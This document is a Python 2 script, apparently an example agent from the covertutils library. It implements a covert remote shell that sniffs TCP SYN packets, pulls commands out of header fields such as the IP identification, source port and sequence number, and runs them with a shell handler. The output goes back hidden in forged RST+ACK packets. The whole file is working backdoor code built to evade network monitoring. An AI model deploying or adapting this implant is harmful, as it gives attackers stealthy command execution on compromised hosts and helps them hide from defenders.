from covertutils.datamanipulation import DataTransformer
from covertutils.datamanipulation import StegoInjector

from covertutils.exceptions import StegoDataExtractionException

from covertutils.orchestration import SimpleOrchestrator

from covertutils.handlers import ResponseOnlyHandler

from covertutils.handlers.impl import StandardShellHandler


import socket
import threading
import Queue
from os import urandom

ins_sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x800))
out_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
out_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

stego_config = """
K:_data_:_data_		# Source IP
L:_data_:_data_		# Destination IP

M:_data_:_data_		# Source Port
N:_data_:_data_		# Destination Port

R:_data_:_data_		# Sequence Number
P:_data_:_data_		# Acknowledge Number

Q:_data_:_data_		# IP Identification Field
W:_data_:_data_		# TCP flags

ip_tcp_syn='''
45000014QQQQ000040007aeaKKKKKKKKLLLLLLLL	# IP header
MMMMNNNNRRRRRRRRPPPPPPPP50WW200000000000	# TCP header
'''
"""

passphrase = 'pass'

transformation_list = [
	(       # Tranformation #1		-	"Sequence Number" -> "Acknowledge Number" +1	-	[RFC compliance, as SYN packet arrived]
        ( 'ip_tcp_syn:R', 'ip_tcp_rst_ack:P' ),         # From template:tag to template:tag
        ('!I','!I'),             # Unpack as an 4-byte Integer (reverse Endianess as of network Endianess) and pack it to 4-byte Integer (reverse Endianess again)
        '_data_ + 1'    # Eval this string (with the extracted/unpacked data as '_data_') and pack the result.
    ),
	(       # Tranformation #2a		-	IP Source -> IP Destination
        ( 'ip_tcp_syn:K', 'ip_tcp_rst_ack:L' ),
        ('!I','!I'),
        '_data_'
	),
	(       # Tranformation #2b		-	IP Destination -> IP Source
        ( 'ip_tcp_syn:L', 'ip_tcp_rst_ack:K' ),
        ('!I','!I'),
        '_data_'
	),
	(       # Tranformation #3		-	Source Port -> Destination Port
        ( 'ip_tcp_syn:M', 'ip_tcp_rst_ack:N' ),
        ('!H','!H'),
        '_data_'
	),
	(       # Tranformation #4		-	Destination Port -> Source Port
        ( 'ip_tcp_syn:N', 'ip_tcp_rst_ack:M' ),
        ('!H','!H'),
        '_data_'
	),
	(       # Tranformation #5		-	SYN -> RST+ACK
        ( 'ip_tcp_syn:W', 'ip_tcp_rst_ack:W' ),
        ('!B','!B'),
        '_data_ + 18'	#	Make '02' (SYN) to '14' (RST+ACK)
	),
                # No other transformations
]

dt1 = DataTransformer(stego_config, transformation_list)
steg_inj = StegoInjector(stego_config)

orchestrator = SimpleOrchestrator( passphrase,
							tag_length = 3,
							in_length = 8,
							out_length = 6,
							)
packets = Queue.Queue()


def check_syn( pkt ) :
	pkt = pkt.encode('hex')
	tcp_flags = pkt[94:96]
	return tcp_flags == '02'


def check_empty_tcp( pkt ) :
	return len(pkt) <= 54		# Ethernet 14bytes + IP 20bytes + TCP 20bytes


def strip_pkt( pkt ) :
	return pkt[14:]				# Remove Ethernet Header

def collect_tcp_syns() :
	global packets
	while True :
		pkt = ins_sock.recv(2048)
		if check_syn( pkt ) :
			packets.put( strip_pkt(pkt) )

pkt_collection_thread = threading.Thread( target = collect_tcp_syns )
pkt_collection_thread.daemon = True
pkt_collection_thread.start()

resp = None

def recv( ) :		# Networking Wrapper function needed for the handler
	global resp
	pkt = packets.get()
	resp = dt1.runAll(pkt, template = 'ip_tcp_syn')
	try :
		data_dict = steg_inj.extractByTag(pkt, 'ip_tcp_syn')
	except StegoDataExtractionException :
		return ''
	raw_data = data_dict['Q'] + data_dict['M'] + data_dict['R']
	print str(raw_data).encode('hex')
	return raw_data		# Return the raw data to Handler

def send( raw_data ) :
	data_dict = {
		'Q' : raw_data[0:2],
		'R' : raw_data[2:6],
	}
	pkt = steg_inj.injectByTag(data_dict, template = 'ip_tcp_syn', pkt = resp)
	handler_ip = socket.inet_ntoa(str(steg_inj.extractByTag(resp, template = 'ip_tcp_syn')['L']))
	out_sock.sendto( pkt, (handler_ip, 0) )


class AgentHandler( ResponseOnlyHandler, StandardShellHandler ) :

	def onNotRecognised( self ) :	# When Junk arrives
		send( urandom(6) )		# Respond with a meaningless packet
		pass

	def onChunk( self, stream, message ) :	# When a Chunk arrives
		# print "[+] Got Chunk!"
		if not message :	# If it is not a complete message (but a part of one)
			self.onMessage( stream, self.request_data )	# Treat it as message containing the `self.request_data` string


	def onMessage( self, stream, message ) :	# When a Chunk arrives
		# print "[%] Got a Message!"
		if message == self.request_data :	# If the Message contains the `self.request_data` string
			ret_stream, ret_message = stream, message	# The message to be responded will contain the same value
		else :		# Else pass it through the function pointed by the function dict
			print "[+] Command Run"
			ret_message = StandardShellHandler.onMessage( self, stream, message )

		responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Run the ResponseOnlyHandler onMessage
		# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)
		if not responded :		# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
			self.queueSend( ret_message, stream );	# Make it respond anyway with 'ResponseOnlyHandler.request_data' (see Client)
			responded = ResponseOnlyHandler.onMessage( self, stream, ret_message )	# Now it will responde for sure as a message is manually added to the queue
			assert responded == True		# This way we know it responsed!


agent = AgentHandler( recv, send, orchestrator )

from time import sleep
while True :
	sleep(1)
